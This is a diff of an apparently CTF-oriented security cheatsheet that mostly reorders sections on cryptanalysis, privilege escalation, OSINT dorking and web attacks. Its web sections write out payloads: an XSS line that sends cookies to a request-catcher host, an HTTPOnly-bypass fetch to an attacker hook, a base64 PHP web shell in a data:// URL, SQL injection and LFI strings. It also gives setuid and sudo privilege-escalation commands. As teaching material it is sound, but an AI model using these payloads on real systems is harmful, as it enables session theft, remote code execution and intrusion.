-    The security of Diffie-Hellman is lower than the number of bits in $p$. Consequently, is p is too small (for example 64bits), it is possible to compute the discrete logarithm in a reasonable amount of time.
-
-    ```python
-    from sage.all import *
-    a = discrete_log(Mod(A, p), Mod(g, p))
-    ```
-
-
-
-## AES
-
-⇨ [AES - CBC Mode](#aes---cbc-mode)<br>⇨ [AES - ECB Mode](#aes---ecb-mode)<br>⇨ [AES - OFB Mode](#aes---ofb-mode)<br>⇨ [AES - CTR Mode](#aes---ctr-mode)<br>⇨ [AES - GCM Mode](#aes---gcm-mode)<br>
-
-[AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) A.K.A. Rijndael is a **symmetric** cryptographic algorithm. It uses the **same key** for encryption and decryption.
-
-[This tutorial](https://www.davidwong.fr/blockbreakers/index.html) is a very good introduction to AES and explains the implementation of the 128-bit version. It also goes through the [Square Attack](https://en.wikipedia.org/wiki/Square_attack) for a 4 round AES.
-
-Different [modes of operations](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation) are used to encrypt data larger than 128 bits (16 bytes). Block operation modes are used to encrypt data in one go while stream operation modes are used to encrypt data bit by bit.
-
-The most common block operation modes are:
-
-| Mode | Type | Description |
-| ---- | ---- | ----------- |
-| ECB | Block | Electronic Codebook |
-| CBC | Block | Cipher Block Chaining |
-| PCBC | Block | Propagating Cipher Block Chaining |
-| CTR | Stream | Counter |
-| CFB | Stream | Cipher Feedback |
-| OFB | Stream | Output Feedback |
-
-**Stream ciphers** usually only use the encryption block to create an output called **keystream** from pre-defined values. Then, it xors this keystream with the plaintext. Consequently, when a bit of plaintext is flipped, the corresponding bit of ciphertext is flipped as well. Stream ciphers are often vulnerable to **encryption oracles (CPA)** as their stream of bits is xored to the plaintext. An attacker only have to input null bytes to get this keystream.
-
-* 4-6 round AES
-
-	When a low number of rounds is used, the key can be recovered by using the [Square Attack](https://en.wikipedia.org/wiki/Square_attack). See [this tutorial](https://www.davidwong.fr/blockbreakers/square.html) for an example.
-
-
-* Weak Sbox - [StackExchange](https://crypto.stackexchange.com/questions/89596/linear-aes-expression-of-k-in-aesp-apk?noredirect=1&lq=1) [CryptoHack](https://cryptohack.org/challenges/beatboxer/solutions/)
-
-	A weak S-box in the subBytes step makes AES an affine function : $AES(pt) = A * pt \oplus K$ where $A$ and $K$ are matrices of size 128 in $GF(2)$ and $A$ have a low dependence on the key. $A$ can be inverted and decipher any ciphertext using $pt = A^{-1} * (AES(ct) \oplus K)$.
-	
-	If there are no subBytes at all, the AES key can even be recovered. [See here](https://crypto.stackexchange.com/questions/89596/linear-aes-expression-of-k-in-aesp-apk?noredirect=1&lq=1).
-
-	To solve this types of challenges, you can either implement a symbolic version of your AES variation and solve for the key, or try to find $A$ using linear algebra.
-
-	[RootMe](https://www.root-me.org/en/Challenges/Cryptanalysis/AES-Weaker-variant) - RootMe challenge with no subBytes (identity sbox) and an encryption oracle.
-
-	[CryptoHack](https://cryptohack.org/challenges/beatboxer/solutions/) - CryptoHack challenge with an affine sbox and only one message.
-
-### AES - CBC Mode
-
-
-
-[AES Cipher Block Chaining](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC)) is the most commonly used mode of operation. It uses the previous output to xor the next input.
-
-<!--image -->
-![CBC Encryption](Cryptography/AES/AES%20-%20CBC%20Mode/_img/CBC_encryption.png#gh-light-mode-only)
-![CBC Encryption](Cryptography/AES/AES%20-%20CBC%20Mode/_img/CBC_encryption-dark.png#gh-dark-mode-only)
-![CBC Decryption](Cryptography/AES/AES%20-%20CBC%20Mode/_img/CBC_decryption.png#gh-light-mode-only)
-![CBC Decryption](Cryptography/AES/AES%20-%20CBC%20Mode/_img/CBC_decryption-dark.png#gh-dark-mode-only)
-
-* Bit flipping attack (CPA) - [Wikipedia](https://en.wikipedia.org/wiki/Bit-flipping_attack) [CryptoHack](https://cryptohack.org/courses/symmetric/flipping_cookie/)
-
-    If an attacker can change the ciphertext, they can also alter the plaintext because of the XOR operation in the decryption process. (Homomorphic property of XOR, used in the previous block)
-    
-    **If you want to change the first block of plaintext**, you need to be able to edit the IV, as the first block of plaintext is XORed with the IV. If you don't have access to it, you can try to make the target system ignore the first block and edit the remainder instead. (example: json cookie {admin=False;randomstuff=whatever} -> {admin=False;rando;admin=True} )
-
-    [Custom exploit script](Cryptography/AES/AES%20-%20CBC%20Mode/Tools/bit-flipping-cbc.py) from this [Github gist](https://gist.github.com/nil0x42/8bb48b337d64971fb296b8b9b6e89a0d)
-
-    [Video explanation](https://www.youtube.com/watch?v=QG-z0r9afIs)
-
-
-* IV = Key - [StackExchange](https://crypto.stackexchange.com/questions/16161/problems-with-using-aes-key-as-iv-in-cbc-mode) [CryptoHack](https://aes.cryptohack.org/lazy_cbc/)
-
-    When the IV is chosen as the key, AES becomes insecure. The Key can be leaked if you have a decryption oracle (CCA).
-
-
-
-### AES - ECB Mode
-
-
-
-[AES Electronic CodeBook](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)) is the most basic mode of operation. Each block is encrypted independently of the others.  This is considered **unsecure** for most applications.
-
-<!--image -->
-![ECB Encryption](Cryptography/AES/AES%20-%20ECB%20Mode/_img/601px-ECB_encryption.png#gh-light-mode-only)
-![ECB Encryption](Cryptography/AES/AES%20-%20ECB%20Mode/_img/601px-ECB_encryption-dark.png#gh-dark-mode-only)
-![ECB Decryption](Cryptography/AES/AES%20-%20ECB%20Mode/_img/601px-ECB_decryption.png#gh-light-mode-only)
-![ECB Decryption](Cryptography/AES/AES%20-%20ECB%20Mode/_img/601px-ECB_decryption-dark.png#gh-dark-mode-only)
-
-
-* ECB Encryption Oracle padded with secret - [CryptoHack](https://cryptohack.org/courses/symmetric/ecb_oracle/)
-
-	To leak the secret, we can use the fact that ECB mode is stateless. We can compare the output of a block containing one unknown byte of the secret with all 256 possible outputs. The block that encrypts to the correct output is the one that contains the unknown byte.
-
-* ECB Decryption Oracle - [CryptoHack](https://cryptohack.org/courses/symmetric/ecbcbcwtf/)
-
-	A ECB decryption oracle can simply be used as an AES block decoder. Many modes can be compromised by this oracle.
-	
-
-
-
-### AES - OFB Mode
-
-
-
-[AES Output FeedBack](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Output_feedback_(OFB)) is an unusual stream cipher. It has no real benefits these days over CTR mode. Indeed CTR can be computed in parallel and allows random access in the ciphertext whereas OFB cannot.
-
-<!--image -->
-![OFB Encryption](Cryptography/AES/AES%20-%20OFB%20Mode/_img/601px-OFB_encryption.png#gh-light-mode-only)
-![OFB Encryption](Cryptography/AES/AES%20-%20OFB%20Mode/_img/601px-OFB_encryption-dark.png#gh-dark-mode-only)
-![OFB Decryption](Cryptography/AES/AES%20-%20OFB%20Mode/_img/601px-OFB_decryption.png#gh-light-mode-only)
-![OFB Decryption](Cryptography/AES/AES%20-%20OFB%20Mode/_img/601px-OFB_decryption-dark.png#gh-dark-mode-only)
-
-
-
-### AES - CTR Mode
-
-
-
-[AES Counter Mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Counter_(CTR)) is using the AES output as a xor key. To generate the output a nonce is used, modified by a counter (concatenated, summed ...) at each block.
-
-The main problem with this mode is that the nonce must be unique for each message, and the counter must be different for each block (it can be reset at each message). If this is not the case, the xor key will be the same for different blocks, which can compromise the encrypted message. (See the weaknesses of [XOR encryption](#..)
-
-![CTR Encryption](Cryptography/AES/AES%20-%20CTR%20Mode/_img/601px-CTR_encryption_2.png#gh-light-mode-only)
-![CTR Encryption](Cryptography/AES/AES%20-%20CTR%20Mode/_img/601px-CTR_encryption_2-dark.png#gh-dark-mode-only)
-![CTR Decryption](Cryptography/AES/AES%20-%20CTR%20Mode/_img/601px-CTR_decryption_2.png#gh-light-mode-only)
-![CTR Decryption](Cryptography/AES/AES%20-%20CTR%20Mode/_img/601px-CTR_decryption_2-dark.png#gh-dark-mode-only)
-
-
-
-
-### AES - GCM Mode
-
-
-
-[AES Galois Counter Mode](https://en.wikipedia.org/wiki/Galois/Counter_Mode) is an authenticated encryption mode. For each encryption it produces a tag that can be used to verify the integrity of the message. It is considered secure and is used in TLS.
-
-
-<!--image -->
-![AES GCM](Cryptography/AES/AES%20-%20GCM%20Mode/_img/GCM-Galois_Counter_Mode_with_IV-dark.png#gh-dark-mode-only)
-![AES GCM](Cryptography/AES/AES%20-%20GCM%20Mode/_img/GCM-Galois_Counter_Mode_with_IV.png#gh-light-mode-only)
-
-
-* Forbidden attack - [CryptoHack](https://aes.cryptohack.org/forbidden_fruit/)
-
-    When the nonce (IV) is reused in 2 different messages, an attacker can forge a tag for any ciphertext.
-
-    [Cryptopals](https://toadstyle.org/cryptopals/63.txt) - Detailed explanation of the attack.
-
-    [GitHub](https://github.com/jvdsn/crypto-attacks/blob/master/attacks/gcm/forbidden_attack.py) - Implementation of the attack.
-
-    [GitHub (Crypton)](https://github.com/ashutosh1206/Crypton/tree/master/Authenticated-Encryption/AES-GCM/Attack-Forbidden) - Summary of the attack.
-
-    [This custom python script](Cryptography/AES/AES%20-%20GCM%20Mode/Tools/forbidden_attack.py) gives an example implementation of the attack.
-
-
-
-
-
-## DES
-
-
-
-[DES](https://en.wikipedia.org/wiki/Data_Encryption_Standard) A.K.A. Data Encryption Standard is a **symmetric** cryptographic algorithm. It uses the **same key** for encryption and decryption. It is a block cipher that encrypts data 64 bits at a time using a 56-bit key. The key is sometimes completed with an additional byte for parity check. DES is now considered insecure and has been replaced by AES.
-
-Variations such as [Triple DES](https://en.wikipedia.org/wiki/Triple_DES) (3DES) and [DES-X](https://en.wikipedia.org/wiki/DES-X) have been created to improve the security of DES.
-
-
-
-* Weak keys - [Wikipedia](https://en.wikipedia.org/wiki/Weak_key#Weak_keys_in_DES) [CryptoHack](https://aes.cryptohack.org/triple_des/)
-
-    DES allows for weak keys which are keys that produce the same ciphertext when used for encryption and decryption.
-
-    Some weak keys with valid parity check are:
-
-    * 0x0101010101010101
-    * 0xFEFEFEFEFEFEFEFE
-    * 0xE0E0E0E0F1F1F1F1
-    * 0x1F1F1F1F0E0E0E0E
-
-    Using multiple of these keys in [2 or 3 keys triple DES](https://en.wikipedia.org/wiki/Triple_DES#Keying_options) can also produce a symmetric 3DES block cipher.
-
-
-
-## RC4
-
-
-
-[RC4](https://en.wikipedia.org/wiki/RC4) is a fast stream cipher known to be very insecure.
-
-
-
-* FMS Attack - [Wikipedia](https://en.wikipedia.org/wiki/Fluhrer,_Mantin_and_Shamir_attack) [CryptoHack](https://aes.cryptohack.org/oh_snap)
-
-    Allows to recover the key from the keystream when RC4's key is in the form (nonce || unknown). Mostly used to recover WEP from WEP SNAP headers. An implementation and description of this attack can be found on [GitHub](https://github.com/jackieden26/FMS-Attack/blob/master/keyRecover.py).
-
-    If you have an encryption (or decryption, it's the same) oracle, I recommend reading the writeups from this [CryptoHack challenge](https://aes.cryptohack.org/oh_snap).
-
-
-
-
-
-## Hashes
-
-
-
-* `Hash types` - [Website](https://hashcat.net/wiki/doku.php?id=example_hashes)
-
-    Different hash types exists, and they are used in different contexts. This page lists the most common hash types and their respective hashcat modes.
-
-| Hash type | Byte Length | Hashcat mode | Example hash  |
-|-----------|--------------|--------------|--------------|
-| MD5      | 32  | 0    | `8743b52063cd84097a65d1633f5c74f5` |
-| SHA1     | 40  | 100  | `b89eaac7e61417341b710b727768294d0e6a277b` |
-| SHA256   | 64  | 1400 | `127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935` |
-| SHA2-512 | 128 | 1700 | too long |
-
-
-
-* `Haiti` - [GitHub](https://github.com/noraj/haiti/)
-
-    CLI Hash type identifier
-
-* `Hashcat` - [Website](https://hashcat.net/hashcat/)
-
-    Crack hashes. Can use GPU.
-
-
-* `John the Ripper` - [Website](https://www.openwall.com/john/)
-
-    Better compatibility and easier to use than hashcat, but lower number of hash types supported.
-
-* `dcipher` - [GitHub](https://github.com/k4m4/dcipher-cli)
-
-    CLI tool to lookup hashes in online databases.
-
-
-
-## Elliptic Curves
-
-
-
-[ECC](https://en.wikipedia.org/wiki/Elliptic-curve_cryptography) is a set of **public-key** cryptographic algorithms based on **elliptic curves** over finite fields. It is used to create **digital signatures** and **key exchanges**.
-
-
 <br><br>
 
 # Pentest
 
-⇨ [Common Exploits](#common-exploits)<br>⇨ [Privilege Escalation](#privilege-escalation)<br>⇨ [Reverse Shell](#reverse-shell)<br>
+⇨ [Common Exploits](#common-exploits)<br>
+⇨ [Reverse Shell](#reverse-shell)<br>
+⇨ [Privilege Escalation](#privilege-escalation)<br>
+
 
 This section describes common techniques used to pentest an infrastructure. As pentesting is not the main focus of this repository, I recommend using [HackTricks](https://book.hacktricks.xyz) for more pentesting-oriented content.
 
@@ -1977,54 +2013,6 @@ This section describes common techniques used to pentest an infrastructure. As p
 	- [ECW2022 author's WU](https://gist.github.com/Amossys-team/e99cc3b979b30c047e6855337fec872e#web---not-so-smart-api)
 
 	- [Request Bin](https://requestbin.net/) Useful for detection and environment variable exfiltration.
-
-
-
-## Privilege Escalation
-
-
-
-* `sudo`
-
-    First thing to check. See what the current user is allowed to do.
-    ```bash
-    sudo -l # List available commands
-    ```
-
-
-* `PEAS` <span style="color:red">❤️</span> - [GitHub](https://github\.com/carlospolop/PEASS-ng)
-
-    Find common misconfigurations and vulnerabilities in Linux and Windows.
-
-    Some payload can be found in the [Tools](Pentest/Privilege%20Escalation/Tools/PEAS/) section.
-
-    Send linpeas via ssh
-    ```bash	
-    scp linpeas.sh user@domain:/tmp
-    ```
-
-
-* setuid Files
-
-    Files with the setuid bit set are executed with the permissions of the owner of the file, not the user who started the program. This can be used to escalate privileges.
-
-    [GTFOBins](https://gtfobins.github.io/) has a list of setuid binaries that can be used to escalate privileges.
-
-    Custom setuid files can be exploited using [binary exploitation](#binary-exploitation).
-
-
-    Find files with the setuid bit set.
-    ``` bash
-    find / -perm -u=s -type f 2>/dev/null
-    ```
-
-* `CVE-2021-3156` - [Website](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156)
-
-    sudo versions before **1.9.5p2** are vulnerable to a heap-based buffer overflow. This can be exploited to gain root access. Very useful on older systems.
-
-    Some payload can be found in the [Tools](Pentest/Privilege%20Escalation/Tools/CVE-2021-3156/) section.
-
-
 
 
 
@@ -2129,6 +2117,54 @@ Sometimes both types of shells are wrongly called `reverse shell`.
 
     Check [this github repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md) for more bind shells.
 
+
+
+
+
+
+## Privilege Escalation
+
+
+
+* `sudo`
+
+    First thing to check. See what the current user is allowed to do.
+    ```bash
+    sudo -l # List available commands
+    ```
+
+
+* `PEAS` <span style="color:red">❤️</span> - [GitHub](https://github\.com/carlospolop/PEASS-ng)
+
+    Find common misconfigurations and vulnerabilities in Linux and Windows.
+
+    Some payload can be found in the [Tools](Pentest/Privilege%20Escalation/Tools/PEAS/) section.
+
+    Send linpeas via ssh
+    ```bash	
+    scp linpeas.sh user@domain:/tmp
+    ```
+
+
+* setuid Files
+
+    Files with the setuid bit set are executed with the permissions of the owner of the file, not the user who started the program. This can be used to escalate privileges.
+
+    [GTFOBins](https://gtfobins.github.io/) has a list of setuid binaries that can be used to escalate privileges.
+
+    Custom setuid files can be exploited using [binary exploitation](#binary-exploitation).
+
+
+    Find files with the setuid bit set.
+    ``` bash
+    find / -perm -u=s -type f 2>/dev/null
+    ```
+
+* `CVE-2021-3156` - [Website](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156)
+
+    sudo versions before **1.9.5p2** are vulnerable to a heap-based buffer overflow. This can be exploited to gain root access. Very useful on older systems.
+
+    Some payload can be found in the [Tools](Pentest/Privilege%20Escalation/Tools/CVE-2021-3156/) section.
 
 
 
@@ -2290,11 +2326,27 @@ WHEN GIVEN A FILE TO WORK WITH, DO NOT FORGET TO RUN THIS STEGHIDE WITH AN EMPTY
 
 # OSINT
 
-⇨ [Email](#email)<br>⇨ [Images](#images)<br>⇨ [Map](#map)<br>⇨ [Username](#username)<br>⇨ [Dorking](#dorking)<br>
+⇨ [Username](#username)<br>
+⇨ [Email](#email)<br>
+⇨ [Dorking](#dorking)<br>
+⇨ [Images](#images)<br>
+⇨ [Map](#map)<br>
+
 
 * `Wayback machine` - [Website](https://archive.org/)
 
     Find old/previous versions of a website.
+
+## Username
+
+
+
+* `Sherlock` - [GitHub](https://github\.com/sherlock-project/sherlock)
+
+    Python script to search for usernames across social networks.
+
+
+
 
 ## Email
 
@@ -2310,6 +2362,49 @@ WHEN GIVEN A FILE TO WORK WITH, DO NOT FORGET TO RUN THIS STEGHIDE WITH AN EMPTY
     A gmail address can be used to query public information on google services like Google Maps reviews or Google Calendar events. [Epieos](https://epieos.com) can find such services.
 
 
+
+
+
+## Dorking
+
+
+
+Dorking is the process of using search engines to find information about a target.
+
+
+* `Google Dorks` - [Wikipedia](https://en.wikipedia.org/wiki/Google_hacking) [CheatSheet](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06) 
+
+    Use Google's search engine to find indexed pages that contain specific information.
+    provides detailed information about Google Dorks.
+
+    The most common ones are:
+    ```bash
+    site:example.com           # Search for a specific domain
+    inurl: "ViewerFrame?Mode=" # Search for a specific string in the URL (exposed webcams)
+    intitle: "index of"        # Search for a specific string in the title of the page (exposed dirs)
+    filetype:pdf               # Search for a specific file type
+    ```
+
+* `Github Dorks`
+
+    Use Github's search engine to find indexed files that contain specific information. [This documentation](https://docs.github.com/en/search-github/searching-on-github) can be used to craft search queries.
+
+    Github users can be tracked using [Gitive](https://github.com/mxrch/GitFive).
+
+    The most common dork keywords are:
+    ```bash
+    filename:passwords.txt     # Search for a specific filename
+    extension:txt              # Search for a specific file extension
+    owner:username             # Search for a specific username
+    
+    # In commits
+    author-name:username       # Search for a specific commit author
+    author-email:u@ex.com      # Search for a specific commit author email
+    committer-name:username    # Search for a specific committer
+    committer-email:u@ex.com   # Search for a specific committer email
+    ```
+
+    
 
 
 
@@ -2368,72 +2463,13 @@ WHEN GIVEN A FILE TO WORK WITH, DO NOT FORGET TO RUN THIS STEGHIDE WITH AN EMPTY
     [adsbexchange.com](https://globe.adsbexchange.com) can be used to find free public ADS-B data.
 
 
-
-## Username
-
-
-
-* `Sherlock` - [GitHub](https://github\.com/sherlock-project/sherlock)
-
-    Python script to search for usernames across social networks.
-
-
-
-
-## Dorking
-
-
-
-Dorking is the process of using search engines to find information about a target.
-
-
-* `Google Dorks` - [Wikipedia](https://en.wikipedia.org/wiki/Google_hacking) [CheatSheet](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06) 
-
-    Use Google's search engine to find indexed pages that contain specific information.
-    provides detailed information about Google Dorks.
-
-    The most common ones are:
-    ```bash
-    site:example.com           # Search for a specific domain
-    inurl: "ViewerFrame?Mode=" # Search for a specific string in the URL (exposed webcams)
-    intitle: "index of"        # Search for a specific string in the title of the page (exposed dirs)
-    filetype:pdf               # Search for a specific file type
-    ```
-
-* `Github Dorks`
-
-    Use Github's search engine to find indexed files that contain specific information. [This documentation](https://docs.github.com/en/search-github/searching-on-github) can be used to craft search queries.
-
-    Github users can be tracked using [Gitive](https://github.com/mxrch/GitFive).
-
-    The most common dork keywords are:
-    ```bash
-    filename:passwords.txt     # Search for a specific filename
-    extension:txt              # Search for a specific file extension
-    owner:username             # Search for a specific username
-    
-    # In commits
-    author-name:username       # Search for a specific commit author
-    author-email:u@ex.com      # Search for a specific commit author email
-    committer-name:username    # Search for a specific committer
-    committer-email:u@ex.com   # Search for a specific committer email
-    ```
-
-    
-
-
 <br><br>
 
 # Jail Break
 
-⇨ [Latex](#latex)<br>⇨ [Python](#python)<br>⇨ [Bash](#bash)<br>
-
-
-
-## Latex
-
-
-
+⇨ [Python](#python)<br>
+⇨ [Bash](#bash)<br>
+⇨ [Latex](#latex)<br>
 
 
 
@@ -2611,11 +2647,25 @@ Dorking is the process of using search engines to find information about a targe
 
 
 
+
+## Latex
+
+
+
+
+
+
 <br><br>
 
 # Web
 
-⇨ [GraphQL](#graphql)<br>⇨ [SQL Injection](#sql-injection)<br>⇨ [XSS](#xss)<br>⇨ [Enumeration](#enumeration)<br>⇨ [PHP](#php)<br>⇨ [Request and Cookie Forgery](#request-and-cookie-forgery)<br>
+⇨ [PHP](#php)<br>
+⇨ [SQL Injection](#sql-injection)<br>
+⇨ [GraphQL](#graphql)<br>
+⇨ [Request and Cookie Forgery](#request-and-cookie-forgery)<br>
+⇨ [Enumeration](#enumeration)<br>
+⇨ [XSS](#xss)<br>
+
 
 * `wpscan` - [Website](https://wpscan.org/)
 
@@ -2657,27 +2707,51 @@ Dorking is the process of using search engines to find information about a targe
 	aws s3 cp --recursive --no-sign-request s3://<bucket_name> .
 	```
 
-## GraphQL
+## PHP
 
 
 
-GraphQL is a query language for APIs.
 
-* `graphQLmap` - [GitHub](https://github.com/swisskyrepo/GraphQLmap)
+* `Magic Hashes` - [CheatSheet](https://github.com/spaze/hashes)
 
-    Parse a GraphQL endpoint and extract data from it using introspection queries.
+	In [PHP](https://en.wikipedia.org/wiki/PHP), the `==` applies type juggling, so if the hash starts with `0e`, then the hash will be evaluated as 0 (scientific notation). This can be used to bypass authentication.
 
-    ```bash
-    # Dump names with introspection
-    dump_via_introspection
-    
-    # Make a query
-    {name(id: 0){id, value}}
+	Since 1/256 hashes have this property, it is relatively easy to bruteforce strings with selected characters.
 
-    # Check if there is something in the first 30 ids
-    {name(id: GRAPHQL_INCREMENT_10){id, value}}
-    ```
+	example: `md5("240610708") = 0e462097431906509019562988736854`
 
+
+* `preg_replace` - [Manual](http://php.net/manual/en/function.preg-replace.php)
+
+	A bug in older versions of [PHP](https://en.wikipedia.org/wiki/PHP) where the user could get remote code execution
+
+
+* `phpdc.phpr` - [GitHub](https://github\.com/lighttpd/xcache/blob/master/bin/phpdc.phpr)
+
+	A command-line tool to decode [`bcompiler`](http://php.net/manual/en/book.bcompiler.php) compiled [PHP](https://en.wikipedia.org/wiki/PHP) code.
+
+
+* `php://filter for Local File Inclusion` - [Website](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/) 
+
+	A bug in [PHP](https://en.wikipedia.org/wiki/PHP) where if GET HTTP variables in the URL are controlling the navigation of the web page, perhaps the source code is `include`-ing other files to be served to the user. This can be manipulated by using [PHP filters](http://php.net/manual/en/filters.php) to potentially retrieve source code. Example like so:
+
+	```
+	http://example.com/index.php?m=php://filter/convert.base64-encode/resource=index
+	```
+
+
+* `data://text/plain;base64` <span style="color:red">❤️</span>
+
+	A [PHP](https://en.wikipedia.org/wiki/PHP) stream that can be taken advantage of if used and evaluated as an `include` resource or evaluated. Can be used for RCE: check out this writeup: [https://ctftime.org/writeup/8868](https://ctftime.org/writeup/8868)
+
+	```
+	http://dommain.net?cmd=whoami&page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=
+	```
+
+
+* `PHP Generic Gadget Chains` - [GitHub](https://github\.com/ambionics/phpggc)
+
+	Payloads for Object injection in `unserialize` on different frameworks.
 
 
 
@@ -2715,65 +2789,75 @@ SELECT * FROM users WHERE username = 'admin' AND password = "" OR 1=1--"
 
 
 
-## XSS
-
-⇨ [SSTI](#ssti)<br>
-
-The **XSS** vulnerability occurs when a user can control the content of a web page. A malicious code can be used to steal cookies of authentified users, redirect the user to a malicious site, or even execute arbitrary code on the user's machine.
-
-Example of XSS :
-
-```html
-<img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
-```
-
-These sites can be used to create hooks to catch HTTP requests:
-
-| Site |
-| --- |
-| [`requestb.in`](https://requestb.in/) |
-| [`hookbin.com`](https://hookbin.com/) |
-
-
-* `XSS Cheat sheet` - [CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
-
-* `Filter Evasion` - [CheatSheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
-
-	Bypass XSS filters.
-
-* `HTTPOnly cookie flag`
-
-	When the `HTTPOnly` flag is set, the cookie is not accessible by JavaScript. This can be bypassed by using the target's browser as a proxy to receive the cookie when it is sent to the victim's browser:
-
-	```html
-	<!-- With the script tag -->
-	<script>
-	fetch("https://target-site.url/")
-	.then((data) => fetch("https://<myHook>/?/=".concat(JSON.stringify(data)), { credentials: 'include' }));
-	</script>
-
-	<!-- With an image -->
-	<img src="https://target-site.url/" onerror="fetch('https://<myHook>/?/='+JSON.stringify(this), { credentials: 'include' })">
-	```
+## GraphQL
 
 
 
-* `XSStrike` - [GitHub](https://github.com/UltimateHackers/XSStrike)
+GraphQL is a query language for APIs.
 
-	A python CLI tool for XSS detection and exploitation.
+* `graphQLmap` - [GitHub](https://github.com/swisskyrepo/GraphQLmap)
+
+    Parse a GraphQL endpoint and extract data from it using introspection queries.
+
+    ```bash
+    # Dump names with introspection
+    dump_via_introspection
+    
+    # Make a query
+    {name(id: 0){id, value}}
+
+    # Check if there is something in the first 30 ids
+    {name(id: GRAPHQL_INCREMENT_10){id, value}}
+    ```
 
 
-### SSTI
+
+
+## Request and Cookie Forgery
 
 
 
-Server Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject code into a server-side template, which is then executed server-side. This can lead to Remote Code Execution (RCE).
 
-* Jinja2 - [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
+* URL Encoding
 
-    Jinja2 is a template engine for Python, notably used in Flask. It can be used to create HTML pages from a template. Even though it uses a sandbox to process data, some tricks allows for RCE on the server.
+    URL encoding is a way to encode special characters in a URL. The code is the `%` character followed by the Hex representation of the character in ascii. For example, the `?` character is encoded as `%3F`, space is `%20` etc.
+    
+    Read [this](https://www.w3schools.com/tags/ref_urlencode.asp) for more details on how to encode characters.
 
 
+* IP restriction bypass with the `X-Forwarded-For` header
+
+    Some servers use the `X-Forwarded-For` header to check if the request comes from a valid IP address. This is a vulnerability since it can be changed by the client, and used to bypass IP restrictions. 
+    
+    Use [burp](https://portswigger.net/burp) or python's `requests` library to set the header.
+
+
+* Authentication bypass with `User-Agent` header
+
+    Some servers use the `User-Agent` header to authenticate the user. Usually this field is used to identify the browser's version and OS, but it can be changed by the client.
+    
+    Use [burp](https://portswigger.net/burp) or python's `requests` library to set the header.
+
+* Verb tampering
+
+    Servers can have different behaviors depending on the HTTP verb used. For example, a server can return a 404 error when a `GET` request is made, but return a 200 when a `PUT` request is made.
+
+    Read [this](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering) for more details on how to test it.
+
+* JWT tempering
+
+    JWTs are a way to authenticate users. They are encoded strings that contain the user's information. The server can decode the JWT and use the information to authenticate the user. 
+    
+    [`jwt_tools`](https://github.com/ticarpi/jwt_tool) can help with modifying the JWTs. They also document common vulnerabilities in JWTs [in their wiki page](https://github.com/ticarpi/jwt_tool/wiki)
+    ```bash
+    python jwt_tool.py <jwt>        # Inspect the JWT
+    python jwt_tool.py -T <jwt>     # Modify (temper) the JWT
+    python jwt_tool.py -C -d <jwt>  # Crack the JWT's signature
+    ```
+
+* AES CBC ciphered cookies
+
+    See [Bit flipping attack](#aes---cbc-mode) for more details.
 
 
 
@@ -2835,211 +2919,79 @@ Server Side Template Injection (SSTI) is a vulnerability that allows an attacker
 
 
 
-## PHP
+## XSS
+
+⇨ [SSTI](#ssti)<br>
 
 
+The **XSS** vulnerability occurs when a user can control the content of a web page. A malicious code can be used to steal cookies of authentified users, redirect the user to a malicious site, or even execute arbitrary code on the user's machine.
+
+Example of XSS :
+
+```html
+<img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
+```
+
+These sites can be used to create hooks to catch HTTP requests:
+
+| Site |
+| --- |
+| [`requestb.in`](https://requestb.in/) |
+| [`hookbin.com`](https://hookbin.com/) |
 
 
-* `Magic Hashes` - [CheatSheet](https://github.com/spaze/hashes)
+* `XSS Cheat sheet` - [CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
-	In [PHP](https://en.wikipedia.org/wiki/PHP), the `==` applies type juggling, so if the hash starts with `0e`, then the hash will be evaluated as 0 (scientific notation). This can be used to bypass authentication.
+* `Filter Evasion` - [CheatSheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
 
-	Since 1/256 hashes have this property, it is relatively easy to bruteforce strings with selected characters.
+	Bypass XSS filters.
 
-	example: `md5("240610708") = 0e462097431906509019562988736854`
+* `HTTPOnly cookie flag`
 
+	When the `HTTPOnly` flag is set, the cookie is not accessible by JavaScript. This can be bypassed by using the target's browser as a proxy to receive the cookie when it is sent to the victim's browser:
 
-* `preg_replace` - [Manual](http://php.net/manual/en/function.preg-replace.php)
+	```html
+	<!-- With the script tag -->
+	<script>
+	fetch("https://target-site.url/")
+	.then((data) => fetch("https://<myHook>/?/=".concat(JSON.stringify(data)), { credentials: 'include' }));
+	</script>
 
-	A bug in older versions of [PHP](https://en.wikipedia.org/wiki/PHP) where the user could get remote code execution
-
-
-* `phpdc.phpr` - [GitHub](https://github\.com/lighttpd/xcache/blob/master/bin/phpdc.phpr)
-
-	A command-line tool to decode [`bcompiler`](http://php.net/manual/en/book.bcompiler.php) compiled [PHP](https://en.wikipedia.org/wiki/PHP) code.
-
-
-* `php://filter for Local File Inclusion` - [Website](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/) 
-
